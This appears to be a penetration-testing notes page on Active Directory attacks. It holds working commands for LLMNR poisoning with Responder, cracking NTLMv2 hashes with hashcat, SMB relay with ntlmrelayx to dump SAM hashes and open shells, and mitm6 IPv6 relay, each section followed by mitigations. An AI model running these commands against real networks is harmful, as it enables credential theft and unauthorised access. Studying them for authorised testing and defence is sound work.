---
layout: default
title: 01. Active Directory Attack Vectors
nav_order: 2
has_children: false
parent: Active Directory
grand_parent: Pentesting
---

## 01.Active Directory Attack Vectors

Strategies:
1. Start with mitm6 or responder
2. Run scan to generate trafic (Nessus / Nmap)
3. if scan is too long, target website included in the scope. (http_version in metasploit)
4. Look for default credentials (Printers, Jenkins, Oracle, ....)


### LLMNR Poisoning

- Used to identify host when DNS is failing
- Previously called NBT-NS
- When we respond to this service, it respond with a username and the hashes

![LLMNR Poisoning](/writings/docs/assets/LLMNR.png)
![](docs/assets/LLMNR.png)

#### Responder (Capture NTLMv2 hashes)

The first step to perform this attack is to run [responder](https://github.com/lgandx/Responder).

It could be installed with [impacket toolkit](https://github.com/fortra/impacket).

It is the first tool to launch when starting an assignment.

Example using the `eth0` interface: 
```bash
python Responder.py -I eth0 -rdwv
```

When an event occurs, we receive the information about the user performing it, including his hash.

#### Crack NTLMv2 hashes

When we retrieve the hash we are going to crack it:

```bash
hashcat -m 5600 hashes.txt rockyou.txt
```


#### LLMNR Mitigation

- Disable LLMNR and NBT-NS
- Enable Network Access Control (NAC)
- Require strong user policy (to avoid the cracking)


### SMB Relay

- Instead of cracking the hash, relay them
- Need SMB signing to be disabled
- Relayed credentatials must be admin on the targeted machine

![SMB Relay](/writings/docs/assets/SMB_Relay.png)![](docs/assets/SMB_Relay.png)

#### Update responder

Updating the `Responder.conf` file by putting the `SMB` and `HTTP` value to `Off`

#### Start responder

We start responder like before, but now the SMB and HTTP server is off:

```bash
python Responder.py -I eth0 -rdwv
```

#### Find targets

Targets must have smb signing disabled, to detect hosts having this particularity, we can use nmap:

```bash
nmap --script=smb2-security-mode.nse -p445 $IP/$RANGE
```

Then we can add the lists of hosts in a file called `targets.txt`. 

#### Start the relay

Then we start the service in charge of the relay: 

```bash
python ntlmrelayx.py -tf targets.txt -smb2support
```

Once it's running, the relay will relay the hash to the other machine and if the connection is established, the SAM hashes are extracted from the host. (hashes of the local user on the computer)

##### Shell access

To update the usage to prompt a shell access we could add the `-i` option to the relay: 
```bash
python ntlmrelayx.py -tf targets.txt -smb2support -i
```

We should see log indicating that a connection is open on a port.

To connect we use netcat:

```bash
netcat 127.0.0.1 11000
```

Then we are inside the smb shell of the corresponding server. 

#### SMB relay mitigation

- Enable SMB signing on every machine (decrease speed of transfer)
- Disable NTLM authentication on the network
- Implement account tierring 
- Restrict permission to local admin

### Gaining Shell Access 

As we might have retrieve credentail from previous section, we could use metasploit and `psexec`to gain a shell access. 

We could also use part of the impacket toolkit: 
- `psexec.py`
- `smbexec.py`
- `wmiexec.py`


### IPv6 - MITM6

#### Installing mitm6

[Github](https://github.com/dirkjanm/mitm6)

Should installed using pip (maybe pip2 if pip3 is breaking the installation) 

#### Launching the attack

```bash
mitm6 -d domain.local
```

From here we are starting to receive trafic form hosts in the network.

#### Setting up the relay

```bash
ntmlrelayx.py -6 -t ldaps://$AD_IP -wh fakewpad.evil.local -l lootme 
```

Now we sould wait for some trafic.

Once we have some trafic, we could check the `lootme` folder to verify all the information we were able to retrieved. 

To go further we could also use the [delegate access](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/).

#### mitm6 mitigation

- Disable IPv6 if no device are using.
- Define block fules in the firewall.
- if WPAD is not used, it should be desactivated via the Group Policy.
- Enable LDAP signing and LDAP channel binding.
- Put admin user in the protected group in order to avoid the delegate access exploitation. 


### Passback attack

[Detail on the article](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)


### References:

- [https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa) 